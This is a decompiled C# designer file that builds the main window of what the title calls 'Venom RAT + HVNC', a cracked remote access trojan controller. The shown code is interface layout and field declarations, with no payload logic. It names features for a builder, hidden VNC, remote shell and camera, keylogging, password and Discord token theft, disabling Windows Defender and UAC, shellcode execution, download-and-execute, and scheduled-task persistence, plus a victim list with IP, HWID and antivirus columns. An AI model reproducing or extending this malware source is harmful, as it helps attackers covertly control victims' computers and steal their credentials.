			this.BtnPMTelegram.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("BtnPMTelegram.Image");
			this.BtnPMTelegram.Location = new global::System.Drawing.Point(979, 0);
			this.BtnPMTelegram.Name = "BtnPMTelegram";
			this.BtnPMTelegram.ShadowDecoration.Parent = this.BtnPMTelegram;
			this.BtnPMTelegram.Size = new global::System.Drawing.Size(106, 31);
			this.BtnPMTelegram.TabIndex = 9;
			this.BtnPMTelegram.Text = "PM TG";
			this.BtnPMTelegram.Click += new global::System.EventHandler(this.BtnPMTelegram_Click);
			this.Btnwebsite.BackColor = global::System.Drawing.Color.Transparent;
			this.Btnwebsite.BorderColor = global::System.Drawing.Color.Transparent;
			this.Btnwebsite.BorderRadius = 1;
			this.Btnwebsite.BorderThickness = 1;
			this.Btnwebsite.CheckedState.Parent = this.Btnwebsite;
			this.Btnwebsite.CustomImages.Parent = this.Btnwebsite;
			this.Btnwebsite.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.Btnwebsite.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.Btnwebsite.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Btnwebsite.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Btnwebsite.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.Btnwebsite.DisabledState.Parent = this.Btnwebsite;
			this.Btnwebsite.FillColor = global::System.Drawing.Color.Transparent;
			this.Btnwebsite.FillColor2 = global::System.Drawing.Color.Transparent;
			this.Btnwebsite.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Btnwebsite.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.Btnwebsite.HoverState.Parent = this.Btnwebsite;
			this.Btnwebsite.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("Btnwebsite.Image");
			this.Btnwebsite.Location = new global::System.Drawing.Point(873, 0);
			this.Btnwebsite.Name = "Btnwebsite";
			this.Btnwebsite.ShadowDecoration.Parent = this.Btnwebsite;
			this.Btnwebsite.Size = new global::System.Drawing.Size(106, 31);
			this.Btnwebsite.TabIndex = 9;
			this.Btnwebsite.Text = "Website";
			this.Btnwebsite.Click += new global::System.EventHandler(this.Btnwebsite_Click);
			this.BtnTGgroup.BackColor = global::System.Drawing.Color.Transparent;
			this.BtnTGgroup.BorderColor = global::System.Drawing.Color.Transparent;
			this.BtnTGgroup.BorderRadius = 1;
			this.BtnTGgroup.BorderThickness = 1;
			this.BtnTGgroup.CheckedState.Parent = this.BtnTGgroup;
			this.BtnTGgroup.CustomImages.Parent = this.BtnTGgroup;
			this.BtnTGgroup.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.BtnTGgroup.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.BtnTGgroup.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.BtnTGgroup.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.BtnTGgroup.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.BtnTGgroup.DisabledState.Parent = this.BtnTGgroup;
			this.BtnTGgroup.FillColor = global::System.Drawing.Color.Transparent;
			this.BtnTGgroup.FillColor2 = global::System.Drawing.Color.Transparent;
			this.BtnTGgroup.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.BtnTGgroup.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.BtnTGgroup.HoverState.Parent = this.BtnTGgroup;
			this.BtnTGgroup.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("BtnTGgroup.Image");
			this.BtnTGgroup.Location = new global::System.Drawing.Point(767, 0);
			this.BtnTGgroup.Name = "BtnTGgroup";
			this.BtnTGgroup.ShadowDecoration.Parent = this.BtnTGgroup;
			this.BtnTGgroup.Size = new global::System.Drawing.Size(106, 31);
			this.BtnTGgroup.TabIndex = 9;
			this.BtnTGgroup.Text = "Videos";
			this.BtnTGgroup.Click += new global::System.EventHandler(this.BtnTGgroup_Click);
			this.BtcnhvncClients.BackColor = global::System.Drawing.Color.Transparent;
			this.BtcnhvncClients.BorderColor = global::System.Drawing.Color.Transparent;
			this.BtcnhvncClients.BorderRadius = 1;
			this.BtcnhvncClients.BorderThickness = 1;
			this.BtcnhvncClients.CheckedState.Parent = this.BtcnhvncClients;
			this.BtcnhvncClients.CustomImages.Parent = this.BtcnhvncClients;
			this.BtcnhvncClients.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.BtcnhvncClients.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.BtcnhvncClients.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.BtcnhvncClients.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.BtcnhvncClients.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.BtcnhvncClients.DisabledState.Parent = this.BtcnhvncClients;
			this.BtcnhvncClients.FillColor = global::System.Drawing.Color.Transparent;
			this.BtcnhvncClients.FillColor2 = global::System.Drawing.Color.Transparent;
			this.BtcnhvncClients.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.BtcnhvncClients.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.BtcnhvncClients.HoverState.Parent = this.BtcnhvncClients;
			this.BtcnhvncClients.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("BtcnhvncClients.Image");
			this.BtcnhvncClients.Location = new global::System.Drawing.Point(661, 0);
			this.BtcnhvncClients.Name = "BtcnhvncClients";
			this.BtcnhvncClients.ShadowDecoration.Parent = this.BtcnhvncClients;
			this.BtcnhvncClients.Size = new global::System.Drawing.Size(106, 31);
			this.BtcnhvncClients.TabIndex = 9;
			this.BtcnhvncClients.Text = "HVNC Panel";
			this.BtcnhvncClients.Click += new global::System.EventHandler(this.BtcnhvncClients_Click);
			this.BuilderToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.BuilderToolStripMenuItem.BorderColor = global::System.Drawing.Color.Transparent;
			this.BuilderToolStripMenuItem.BorderRadius = 1;
			this.BuilderToolStripMenuItem.BorderThickness = 1;
			this.BuilderToolStripMenuItem.CheckedState.Parent = this.BuilderToolStripMenuItem;
			this.BuilderToolStripMenuItem.CustomImages.Parent = this.BuilderToolStripMenuItem;
			this.BuilderToolStripMenuItem.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.BuilderToolStripMenuItem.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.BuilderToolStripMenuItem.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.BuilderToolStripMenuItem.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.BuilderToolStripMenuItem.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.BuilderToolStripMenuItem.DisabledState.Parent = this.BuilderToolStripMenuItem;
			this.BuilderToolStripMenuItem.FillColor = global::System.Drawing.Color.Transparent;
			this.BuilderToolStripMenuItem.FillColor2 = global::System.Drawing.Color.Transparent;
			this.BuilderToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.BuilderToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.BuilderToolStripMenuItem.HoverState.Parent = this.BuilderToolStripMenuItem;
			this.BuilderToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("BuilderToolStripMenuItem.Image");
			this.BuilderToolStripMenuItem.Location = new global::System.Drawing.Point(555, 0);
			this.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem";
			this.BuilderToolStripMenuItem.ShadowDecoration.Parent = this.BuilderToolStripMenuItem;
			this.BuilderToolStripMenuItem.Size = new global::System.Drawing.Size(106, 31);
			this.BuilderToolStripMenuItem.TabIndex = 9;
			this.BuilderToolStripMenuItem.Text = "Builder";
			this.BuilderToolStripMenuItem.Click += new global::System.EventHandler(this.builderToolStripMenuItem1_Click);
			this.BtnClientFolder.BackColor = global::System.Drawing.Color.Transparent;
			this.BtnClientFolder.BorderColor = global::System.Drawing.Color.Transparent;
			this.BtnClientFolder.BorderRadius = 1;
			this.BtnClientFolder.BorderThickness = 1;
			this.BtnClientFolder.CheckedState.Parent = this.BtnClientFolder;
			this.BtnClientFolder.CustomImages.Parent = this.BtnClientFolder;
			this.BtnClientFolder.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.BtnClientFolder.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.BtnClientFolder.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.BtnClientFolder.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.BtnClientFolder.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.BtnClientFolder.DisabledState.Parent = this.BtnClientFolder;
			this.BtnClientFolder.FillColor = global::System.Drawing.Color.Transparent;
			this.BtnClientFolder.FillColor2 = global::System.Drawing.Color.Transparent;
			this.BtnClientFolder.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.BtnClientFolder.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.BtnClientFolder.HoverState.Parent = this.BtnClientFolder;
			this.BtnClientFolder.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("BtnClientFolder.Image");
			this.BtnClientFolder.Location = new global::System.Drawing.Point(449, 0);
			this.BtnClientFolder.Name = "BtnClientFolder";
			this.BtnClientFolder.ShadowDecoration.Parent = this.BtnClientFolder;
			this.BtnClientFolder.Size = new global::System.Drawing.Size(106, 31);
			this.BtnClientFolder.TabIndex = 9;
			this.BtnClientFolder.Text = "Client Folder";
			this.BtnClientFolder.Click += new global::System.EventHandler(this.BtnClientFolder_Click);
			this.label2.AutoSize = true;
			this.label2.BackColor = global::System.Drawing.Color.Transparent;
			this.label2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label2.ForeColor = global::System.Drawing.Color.FromArgb(29, 185, 84);
			this.label2.Location = new global::System.Drawing.Point(1489, 11);
			this.label2.Name = "label2";
			this.label2.Size = new global::System.Drawing.Size(68, 15);
			this.label2.TabIndex = 6;
			this.label2.Text = "Notification";
			this.label2.Click += new global::System.EventHandler(this.ToolStripStatusLabel2_Click);
			this.panel1.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.panel1.Controls.Add(this.label2);
			this.panel1.Controls.Add(this.label3);
			this.panel1.Controls.Add(this.pictureBox1);
			this.panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.panel1.Location = new global::System.Drawing.Point(0, 0);
			this.panel1.Name = "panel1";
			this.panel1.Size = new global::System.Drawing.Size(1560, 38);
			this.panel1.TabIndex = 18;
			this.label3.AutoSize = true;
			this.label3.BackColor = global::System.Drawing.Color.Transparent;
			this.label3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 11.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label3.ForeColor = global::System.Drawing.Color.Silver;
			this.label3.Location = new global::System.Drawing.Point(34, 11);
			this.label3.Name = "label3";
			this.label3.Size = new global::System.Drawing.Size(147, 18);
			this.label3.TabIndex = 7;
			this.label3.Text = "Cracked by Alkaisa";
			this.pictureBox1.ErrorImage = null;
			this.pictureBox1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("pictureBox1.Image");
			this.pictureBox1.InitialImage = null;
			this.pictureBox1.Location = new global::System.Drawing.Point(3, 7);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new global::System.Drawing.Size(25, 25);
			this.pictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.pictureBox1.TabIndex = 6;
			this.pictureBox1.TabStop = false;
			this.siticoneDragControl1.TargetControl = this.panel1;
			this.siticoneBorderlessForm1.ContainerControl = this;
			this.siticoneBorderlessForm1.ShadowColor = global::System.Drawing.Color.FromArgb(29, 185, 84);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(1560, 787);
			base.Controls.Add(this.siticoneTabControl1);
			base.Controls.Add(this.siticoneGradientPanel1);
			base.Controls.Add(this.panel1);
			base.Controls.Add(this.siticoneGradientPanel2);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.Margin = new global::System.Windows.Forms.Padding(2);
			this.MaximumSize = new global::System.Drawing.Size(1560, 787);
			this.MinimumSize = new global::System.Drawing.Size(1560, 787);
			base.Name = "FormMain";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Venom RAT + HVNC";
			base.Activated += new global::System.EventHandler(this.Form1_Activated);
			base.Deactivate += new global::System.EventHandler(this.Form1_Deactivate);
			base.FormClosed += new global::System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
			base.Load += new global::System.EventHandler(this.Form1_Load);
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter2).EndInit();
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter1).EndInit();
			this.siticoneTabControl1.ResumeLayout(false);
			this.tabPage5.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox2).EndInit();
			this.tabPage1.ResumeLayout(false);
			this.contextMenuClient.ResumeLayout(false);
			this.tabPage2.ResumeLayout(false);
			this.siticoneGradientPanel8.ResumeLayout(false);
			this.tabPage3.ResumeLayout(false);
			this.siticoneGradientPanel4.ResumeLayout(false);
			this.tabPage4.ResumeLayout(false);
			this.siticoneGradientPanel3.ResumeLayout(false);
			this.siticoneGradientPanel2.ResumeLayout(false);
			this.siticoneGradientPanel2.PerformLayout();
			this.siticoneGradientPanel1.ResumeLayout(false);
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x040000F5 RID: 245
		private global::System.ComponentModel.IContainer components;

		// Token: 0x040000F6 RID: 246
		private global::System.Windows.Forms.Timer ConnectTimeout;

		// Token: 0x040000F7 RID: 247
		public global::System.Windows.Forms.ListView listView3;

		// Token: 0x040000F8 RID: 248
		public global::System.Windows.Forms.ImageList ThumbnailImageList;

		// Token: 0x040000F9 RID: 249
		public global::System.Windows.Forms.ListView listView4;

		// Token: 0x040000FA RID: 250
		private global::System.Windows.Forms.ColumnHeader columnHeader4;

		// Token: 0x040000FB RID: 251
		private global::System.Windows.Forms.ColumnHeader columnHeader5;

		// Token: 0x040000FC RID: 252
		public global::System.Windows.Forms.ListView listView2;

		// Token: 0x040000FD RID: 253
		private global::System.Windows.Forms.ColumnHeader columnHeader1;

		// Token: 0x040000FE RID: 254
		private global::System.Windows.Forms.ColumnHeader columnHeader2;

		// Token: 0x040000FF RID: 255
		private global::System.Windows.Forms.Timer TimerTask;

		// Token: 0x04000100 RID: 256
		public global::System.Windows.Forms.NotifyIcon notifyIcon1;

		// Token: 0x04000101 RID: 257
		private global::System.Diagnostics.PerformanceCounter performanceCounter2;

		// Token: 0x04000102 RID: 258
		private global::System.Diagnostics.PerformanceCounter performanceCounter1;

		// Token: 0x04000103 RID: 259
		private global::System.Windows.Forms.Timer UpdateUI;

		// Token: 0x04000104 RID: 260
		private global::System.Windows.Forms.Timer ping;

		// Token: 0x04000105 RID: 261
		public global::Siticone.Desktop.UI.WinForms.SiticoneTabControl siticoneTabControl1;

		// Token: 0x04000106 RID: 262
		private global::System.Windows.Forms.TabPage tabPage5;

		// Token: 0x04000107 RID: 263
		private global::System.Windows.Forms.PictureBox pictureBox2;

		// Token: 0x04000108 RID: 264
		private global::System.Windows.Forms.TabPage tabPage1;

		// Token: 0x04000109 RID: 265
		private global::System.Windows.Forms.TabPage tabPage2;

		// Token: 0x0400010A RID: 266
		private global::System.Windows.Forms.TabPage tabPage3;

		// Token: 0x0400010B RID: 267
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel siticoneGradientPanel4;

		// Token: 0x0400010C RID: 268
		private global::System.Windows.Forms.TabPage tabPage4;

		// Token: 0x0400010D RID: 269
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel siticoneGradientPanel1;

		// Token: 0x0400010E RID: 270
		private global::System.Windows.Forms.Label label2;

		// Token: 0x0400010F RID: 271
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton Btnwebsite;

		// Token: 0x04000110 RID: 272
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton BtnTGgroup;

		// Token: 0x04000111 RID: 273
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton BtcnhvncClients;

		// Token: 0x04000112 RID: 274
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton BuilderToolStripMenuItem;

		// Token: 0x04000113 RID: 275
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton BtnClientFolder;

		// Token: 0x04000114 RID: 276
		private global::System.Windows.Forms.Panel panel1;

		// Token: 0x04000115 RID: 277
		private global::System.Windows.Forms.Label label3;

		// Token: 0x04000116 RID: 278
		private global::System.Windows.Forms.PictureBox pictureBox1;

		// Token: 0x04000117 RID: 279
		private global::Siticone.Desktop.UI.WinForms.SiticoneDragControl siticoneDragControl1;

		// Token: 0x04000118 RID: 280
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton siticoneGradientButton2;

		// Token: 0x04000119 RID: 281
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton siticoneGradientButton9;

		// Token: 0x0400011A RID: 282
		public global::System.Windows.Forms.ListView listView1;

		// Token: 0x0400011B RID: 283
		private global::System.Windows.Forms.ColumnHeader lv_ip;

		// Token: 0x0400011C RID: 284
		private global::System.Windows.Forms.ColumnHeader lv_country;

		// Token: 0x0400011D RID: 285
		private global::System.Windows.Forms.ColumnHeader lv_group;

		// Token: 0x0400011E RID: 286
		public global::System.Windows.Forms.ColumnHeader lv_hwid;

		// Token: 0x0400011F RID: 287
		private global::System.Windows.Forms.ColumnHeader lv_user;

		// Token: 0x04000120 RID: 288
		private global::System.Windows.Forms.ColumnHeader lv_camera;

		// Token: 0x04000121 RID: 289
		private global::System.Windows.Forms.ColumnHeader lv_os;

		// Token: 0x04000122 RID: 290
		private global::System.Windows.Forms.ColumnHeader lv_version;

		// Token: 0x04000123 RID: 291
		private global::System.Windows.Forms.ColumnHeader lv_ins;

		// Token: 0x04000124 RID: 292
		private global::System.Windows.Forms.ColumnHeader lv_admin;

		// Token: 0x04000125 RID: 293
		private global::System.Windows.Forms.ColumnHeader lv_av;

		// Token: 0x04000126 RID: 294
		public global::System.Windows.Forms.ColumnHeader lv_ping;

		// Token: 0x04000127 RID: 295
		public global::System.Windows.Forms.ColumnHeader lv_act;

		// Token: 0x04000128 RID: 296
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel siticoneGradientPanel2;

		// Token: 0x04000129 RID: 297
		private global::Siticone.Desktop.UI.WinForms.SiticoneControlBox siticoneControlBox3;

		// Token: 0x0400012A RID: 298
		private global::Siticone.Desktop.UI.WinForms.SiticoneControlBox siticoneControlBox4;

		// Token: 0x0400012B RID: 299
		private global::System.Windows.Forms.Label toolStripStatusLabel1;

		// Token: 0x0400012C RID: 300
		private global::Siticone.Desktop.UI.WinForms.SiticoneBorderlessForm siticoneBorderlessForm1;

		// Token: 0x0400012D RID: 301
		public global::Siticone.Desktop.UI.WinForms.SiticoneContextMenuStrip contextMenuClient;

		// Token: 0x0400012E RID: 302
		private global::System.Windows.Forms.ToolStripMenuItem builderToolStripMenuItem1;

		// Token: 0x0400012F RID: 303
		private global::System.Windows.Forms.ToolStripMenuItem controlManagementToolStripMenuItem1;

		// Token: 0x04000130 RID: 304
		private global::System.Windows.Forms.ToolStripMenuItem controlManagementToolStripMenuItem19;

		// Token: 0x04000131 RID: 305
		private global::System.Windows.Forms.ToolStripMenuItem UninstallToolStripMenuItem;

		// Token: 0x04000132 RID: 306
		private global::System.Windows.Forms.ToolStripMenuItem StopToolStripMenuItem1;

		// Token: 0x04000133 RID: 307
		private global::System.Windows.Forms.ToolStripMenuItem RestartToolStripMenuItem1;

		// Token: 0x04000134 RID: 308
		private global::System.Windows.Forms.ToolStripMenuItem UpdateToolStripMenuItem;

		// Token: 0x04000135 RID: 309
		private global::System.Windows.Forms.ToolStripMenuItem controlManagementToolStripMenuItem20;

		// Token: 0x04000136 RID: 310
		private global::System.Windows.Forms.ToolStripMenuItem LogoutToolStripMenuItem;

		// Token: 0x04000137 RID: 311
		private global::System.Windows.Forms.ToolStripMenuItem RebootToolStripMenuItem;

		// Token: 0x04000138 RID: 312
		private global::System.Windows.Forms.ToolStripMenuItem ShutDownToolStripMenuItem;

		// Token: 0x04000139 RID: 313
		private global::System.Windows.Forms.ToolStripMenuItem controlManagementToolStripMenuItem2;

		// Token: 0x0400013A RID: 314
		private global::System.Windows.Forms.ToolStripMenuItem RemoteShellToolStripMenuItem;

		// Token: 0x0400013B RID: 315
		private global::System.Windows.Forms.ToolStripMenuItem RemoteScreenToolStripMenuItem;

		// Token: 0x0400013C RID: 316
		private global::System.Windows.Forms.ToolStripMenuItem RemoteCameraToolStripMenuItem;

		// Token: 0x0400013D RID: 317
		private global::System.Windows.Forms.ToolStripMenuItem FileManagerToolStripMenuItem1;

		// Token: 0x0400013E RID: 318
		private global::System.Windows.Forms.ToolStripMenuItem remoteRegeditToolStripMenuItem;

		// Token: 0x0400013F RID: 319
		private global::System.Windows.Forms.ToolStripMenuItem ProcessManagerToolStripMenuItem;

		// Token: 0x04000140 RID: 320
		private global::System.Windows.Forms.ToolStripMenuItem netstatToolStripMenuItem;

		// Token: 0x04000141 RID: 321
		private global::System.Windows.Forms.ToolStripMenuItem RecordToolStripMenuItem;

		// Token: 0x04000142 RID: 322
		private global::System.Windows.Forms.ToolStripMenuItem controlManagementToolStripMenuItem3;

		// Token: 0x04000143 RID: 323
		private global::System.Windows.Forms.ToolStripMenuItem VisteWebsiteToolStripMenuItem1;

		// Token: 0x04000144 RID: 324
		private global::System.Windows.Forms.ToolStripMenuItem runShellcodeToolStripMenuItem;

		// Token: 0x04000145 RID: 325
		private global::System.Windows.Forms.ToolStripMenuItem ChangeWallpaperToolStripMenuItem1;

		// Token: 0x04000146 RID: 326
		private global::System.Windows.Forms.ToolStripMenuItem FileSearchToolStripMenuItem;

		// Token: 0x04000147 RID: 327
		private global::System.Windows.Forms.ToolStripMenuItem controlManagementToolStripMenuItem4;

		// Token: 0x04000148 RID: 328
		private global::System.Windows.Forms.ToolStripMenuItem DisableWDToolStripMenuItem;

		// Token: 0x04000149 RID: 329
		private global::System.Windows.Forms.ToolStripMenuItem DisableUACToolStripMenuItem;

		// Token: 0x0400014A RID: 330
		private global::System.Windows.Forms.ToolStripMenuItem controlManagementToolStripMenuItem5;

		// Token: 0x0400014B RID: 331
		private global::System.Windows.Forms.ToolStripMenuItem SilentCleanupToolStripMenuItem;

		// Token: 0x0400014C RID: 332
		private global::System.Windows.Forms.ToolStripMenuItem RunasToolStripMenuItem;

		// Token: 0x0400014D RID: 333
		private global::System.Windows.Forms.ToolStripMenuItem controlManagementToolStripMenuItem6;

		// Token: 0x0400014E RID: 334
		private global::System.Windows.Forms.ToolStripMenuItem SchtaskInstallToolStripMenuItem;

		// Token: 0x0400014F RID: 335
		private global::System.Windows.Forms.ToolStripMenuItem SchtaskUninstallToolStripMenuItem;

		// Token: 0x04000150 RID: 336
		private global::System.Windows.Forms.ToolStripMenuItem controlManagementToolStripMenuItem7;

		// Token: 0x04000151 RID: 337
		private global::System.Windows.Forms.ToolStripMenuItem passwordRecoveryToolStripMenuItem;

		// Token: 0x04000152 RID: 338
		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem3;

		// Token: 0x04000153 RID: 339
		private global::System.Windows.Forms.ToolStripMenuItem autoKeyloggerToolStripMenuItem;

		// Token: 0x04000154 RID: 340
		private global::System.Windows.Forms.ToolStripMenuItem controlManagementToolStripMenuItem8;

		// Token: 0x04000155 RID: 341
		private global::System.Windows.Forms.ToolStripMenuItem DiscordRecoveryToolStripMenuItem;

		// Token: 0x04000156 RID: 342
		private global::System.Windows.Forms.ToolStripMenuItem controlManagementToolStripMenuItem9;

		// Token: 0x04000157 RID: 343
		private global::System.Windows.Forms.ToolStripMenuItem BtnHVNCPanel;

		// Token: 0x04000158 RID: 344
		private global::System.Windows.Forms.ToolStripMenuItem justForFunToolStripMenuItem;

		// Token: 0x04000159 RID: 345
		private global::System.Windows.Forms.ToolStripMenuItem BtnClientFolders;

		// Token: 0x0400015A RID: 346
		private global::System.Windows.Forms.ToolStripMenuItem InformationToolStripMenuItem;

		// Token: 0x0400015B RID: 347
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton BtnPMTelegram;

		// Token: 0x0400015C RID: 348
		private global::System.Windows.Forms.ColumnHeader columnHeader3;

		// Token: 0x0400015D RID: 349
		private global::System.Windows.Forms.ColumnHeader columnHeader6;

		// Token: 0x0400015E RID: 350
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel siticoneGradientPanel3;

		// Token: 0x0400015F RID: 351
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton installSchtaskToolStripMenuItem;

		// Token: 0x04000160 RID: 352
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton dELETETASKToolStripMenuItem;

		// Token: 0x04000161 RID: 353
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel siticoneGradientPanel7;

		// Token: 0x04000162 RID: 354
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel siticoneGradientPanel6;

		// Token: 0x04000163 RID: 355
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel siticoneGradientPanel8;

		// Token: 0x04000164 RID: 356
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton cLEARToolStripMenuItem;

		// Token: 0x04000165 RID: 357
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel siticoneGradientPanel5;

		// Token: 0x04000166 RID: 358
		private global::System.Windows.Forms.Panel panel2;

		// Token: 0x04000167 RID: 359
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton uPDATEToolStripMenuItem1;

		// Token: 0x04000168 RID: 360
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton sendFileFromUrlToolStripMenuItem;

		// Token: 0x04000169 RID: 361
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton disableWDToolStripMenuItem1;

		// Token: 0x0400016A RID: 362
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton downloadAndExecuteToolStripMenuItem;

		// Token: 0x0400016B RID: 363
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton disableUACToolStripMenuItem1;

		// Token: 0x0400016C RID: 364
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton sENDFILETOMEMORYToolStripMenuItem1;

		// Token: 0x0400016D RID: 365
		private global::System.Windows.Forms.ToolStripMenuItem moveToHVNCToolStripMenuItem;

		// Token: 0x0400016E RID: 366
		private global::System.Windows.Forms.ToolStripMenuItem executeToolStripMenuItem;

		// Token: 0x0400016F RID: 367
		private global::System.Windows.Forms.ToolStripMenuItem SendFileToMemoryToolStripMenuItem;

		// Token: 0x04000170 RID: 368
		private global::System.Windows.Forms.ToolStripMenuItem SendFileToDiskToolStripMenuItem;

		// Token: 0x04000171 RID: 369
		private global::System.Windows.Forms.ToolStripMenuItem fromUrlToolStripMenuItem;

		// Token: 0x04000172 RID: 370
		private global::System.Windows.Forms.ToolStripMenuItem selectToolStripMenuItem;
	}
}
